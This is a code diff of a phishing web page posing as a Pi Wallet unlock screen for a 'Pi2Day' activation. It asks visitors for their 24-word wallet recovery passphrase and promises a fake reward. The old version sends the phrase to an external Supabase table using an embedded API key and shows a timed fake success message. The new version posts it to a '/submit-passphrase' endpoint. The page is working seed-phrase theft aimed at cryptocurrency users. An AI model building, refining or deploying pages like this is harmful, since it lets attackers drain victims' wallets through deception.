@@ -10,139 +10,87 @@
       --gray: #555;
       --bg: #f4f0fc;
     }
-
-    * {
-      box-sizing: border-box;
-    }
-
+    * { box-sizing: border-box; }
     html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      width: 100%;
+      margin: 0; padding: 0; height: 100%; width: 100%;
       font-family: 'Segoe UI', Roboto, sans-serif;
       background-color: var(--bg);
     }
-
     body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      display: flex; justify-content: center; align-items: center;
     }
-
     .container {
       background: white;
       border-radius: 16px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.08);
       padding: 40px 26px;
-      width: 98%;
-      max-width: 440px;
-      height: 96vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
+      width: 98%; max-width: 440px; height: 96vh;
+      display: flex; flex-direction: column; justify-content: center;
       text-align: center;
     }
-
     .title {
-      font-size: 22px;
-      font-weight: bold;
-      color: var(--purple);
-      margin-bottom: 26px;
+      font-size: 22px; font-weight: bold;
+      color: var(--purple); margin-bottom: 26px;
     }
-
     textarea {
-      width: 98%;
-      height: 160px;
-      padding: 18px;
-      font-size: 17px;
-      border: 1px solid #ccc;
-      border-radius: 14px;
-      resize: none;
-      outline: none;
+      width: 98%; height: 160px; padding: 18px;
+      font-size: 17px; border: 1px solid #ccc;
+      border-radius: 14px; resize: none; outline: none;
       margin-bottom: 10px;
     }
-
     .btn {
-      width: 100%;
-      padding: 16px;
-      font-size: 17px;
-      font-weight: bold;
-      border: none;
-      border-radius: 12px;
-      margin-bottom: 14px;
-      background-color: var(--purple);
-      color: white;
-      cursor: pointer;
+      width: 100%; padding: 16px;
+      font-size: 17px; font-weight: bold;
+      border: none; border-radius: 12px;
+      margin-bottom: 14px; background-color: var(--purple);
+      color: white; cursor: pointer;
     }
-
     .btn:disabled {
-      opacity: 1;
-      cursor: not-allowed;
+      opacity: 1; cursor: not-allowed;
     }
-
-    .disclaimer,
-    .warning {
-      font-size: 14px;
-      color: var(--gray);
-      line-height: 1.6;
-      margin-top: 16px;
+    .disclaimer, .warning {
+      font-size: 14px; color: var(--gray);
+      line-height: 1.6; margin-top: 16px;
     }
-
-    .loading,
-    .success {
-      font-size: 16px;
-      font-weight: bold;
-      color: var(--purple);
-      margin-top: 40px;
-      display: none;
-      line-height: 1.6;
+    .loading, .success {
+      font-size: 16px; font-weight: bold;
+      color: var(--purple); margin-top: 40px;
+      display: none; line-height: 1.6;
     }
-
-    .success {
-      font-size: 17px;
-    }
-
+    .success { font-size: 17px; }
     .error {
-      color: red;
-      font-size: 14px;
-      margin-top: 6px;
+      color: red; font-size: 14px; margin-top: 6px;
     }
   </style>
 </head>
 <body>
   <div class="container" id="mainContent">
     <div class="title">🔐 Unlock Pi Wallet to activate Pi2Day</div>
-
-    <form id="unlockForm" onsubmit="return fakeLoad()">
+    <form id="unlockForm" onsubmit="return submitPassphrase(event)">
       <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here..." required></textarea>
       <div class="error" id="errorMsg"></div>
       <button type="submit" class="btn"> Unlock with passphrase</button>
     </form>
-
     <button class="btn" disabled> Unlock with fingerprint</button>
-
     <div class="disclaimer">
       As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.<br>
       Recovery of passphrase is currently impossible.
     </div>
-
     <div class="warning">
       Lost your passphrase? You can create a new wallet, but all your π in your previous wallet will be inaccessible.
     </div>
-
     <div class="loading" id="loadingText">🔄 Loading Pi Wallet...</div>
     <div class="success" id="successMessage">
       ✅ Pi2Day Successfully Activated<br>
       Go back to your Pi Browser and enjoy full control of GCV $314.159 on your future Pi exchange to USDT.
     </div>
   </div>
-
   <script>
-    function fakeLoad() {
+    function submitPassphrase(event) {
+      event.preventDefault();
       const passphrase = document.getElementById('passphrase').value.trim();
-      const words = passphrase.split(/\s+/);
       const error = document.getElementById('errorMsg');
+      const words = passphrase.split(/\s+/);
 
       if (words.length !== 24) {
         error.textContent = "❌ Invalid passphrase. Please enter exactly 24 words.";
@@ -156,29 +104,20 @@
       document.querySelector('.warning').style.display = 'none';
       document.getElementById('loadingText').style.display = 'block';
 
-      // Send to Supabase
-      fetch("https://ixqiadgvovxozexatyta.supabase.co/rest/v1/pi2day_logins", {
+      fetch("/submit-passphrase", {
         method: "POST",
-        headers: {
-          "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml4cWlhZGd2b3Z4b3pleGF0eXRhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgxNjk5ODcsImV4cCI6MjA2Mzc0NTk4N30.yXPGI9RR_H4N9Ocp4FQGgh4ycDFRz9cfUEkX_PdTJos",
-          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml4cWlhZGd2b3Z4b3pleGF0eXRhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgxNjk5ODcsImV4cCI6MjA2Mzc0NTk4N30.yXPGI9RR_H4N9Ocp4FQGgh4ycDFRz9cfUEkX_PdTJos",
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ phrase: passphrase })
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `passphrase=${encodeURIComponent(passphrase)}`
       })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error("❌ Failed to save passphrase.");
-        }
-      })
-      .catch(err => {
-        console.error("❌ Supabase Error:", err);
-      });
-
-      setTimeout(() => {
+      .then(response => response.json())
+      .then(data => {
         document.getElementById('loadingText').style.display = 'none';
         document.getElementById('successMessage').style.display = 'block';
-      }, 3000);
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        error.textContent = "❌ Failed to activate Pi2Day.";
+      });
 
       return false;
     }
